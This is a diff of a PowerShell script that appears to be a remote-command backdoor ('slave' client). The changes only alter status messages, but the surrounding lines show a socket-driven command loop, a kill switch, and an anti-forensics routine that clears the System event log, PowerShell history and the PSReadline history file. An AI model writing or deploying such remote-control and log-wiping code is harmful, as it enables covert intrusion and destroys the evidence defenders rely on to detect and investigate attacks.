@@ -36,10 +36,10 @@ try {
 					if ($launch -ne "slave established") {
 						if ($launch -match "^cd (.*)") {
 							cd $Matches[1];
-							$client_writer.WriteLine(" ");
+							$client_writer.WriteLine("Directory changed.");
 							$client_writer.Flush();
 						} elseif ($launch -match "--client_shutdown") {
-							$client_writer.WriteLine("client shut down");
+							$client_writer.WriteLine("slave shut down");
 							$client_writer.Flush();
 							$client.Close();
 							$exit = 1;
@@ -50,7 +50,7 @@ try {
 							Clear-EventLog -LogName System;
 							Clear-History
 							Remove-Item (Get-PSReadlineOption).HistorySavePath
-							$client_writer.WriteLine(" ");
+							$client_writer.WriteLine("Logs Wiped.");
 							$client_writer.Flush();
 						} elseif ($launch -match "--kill_switch") {
 							$client_writer.WriteLine("client terminated.");
@@ -73,7 +73,7 @@ try {
 								$client_writer.WriteLine($line);
 
 							}	
-							$client_writer.WriteLine(" ");
+							$client_writer.WriteLine("command complete.");
 							$client_writer.Flush();						
 						}
 					}
